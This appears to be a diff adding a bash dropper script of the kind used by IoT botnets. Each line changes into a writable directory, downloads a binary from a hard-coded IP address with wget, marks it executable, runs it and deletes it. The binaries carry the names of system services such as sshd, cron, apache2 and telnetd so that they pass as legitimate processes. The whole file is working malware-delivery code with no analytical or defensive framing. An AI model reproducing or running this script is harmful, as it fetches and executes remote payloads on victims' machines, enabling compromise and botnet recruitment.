@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Ontpd; chmod +x 5Ontpd; ./5Ontpd; rm -rf 5Ontpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Osshd; chmod +x 5Osshd; ./5Osshd; rm -rf 5Osshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Oopenssh; chmod +x 5Oopenssh; ./5Oopenssh; rm -rf 5Oopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Obash; chmod +x 5Obash; ./5Obash; rm -rf 5Obash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Otftp; chmod +x 5Otftp; ./5Otftp; rm -rf 5Otftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Owget; chmod +x 5Owget; ./5Owget; rm -rf 5Owget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Ocron; chmod +x 5Ocron; ./5Ocron; rm -rf 5Ocron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Oftp; chmod +x 5Oftp; ./5Oftp; rm -rf 5Oftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Opftp; chmod +x 5Opftp; ./5Opftp; rm -rf 5Opftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Osh; chmod +x 5Osh; ./5Osh; rm -rf 5Osh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Oapache2; chmod +x 5Oapache2; ./5Oapache2; rm -rf 5Oapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.158.200.65/5Otelnetd; chmod +x 5Otelnetd; ./5Otelnetd; rm -rf 5Otelnetd
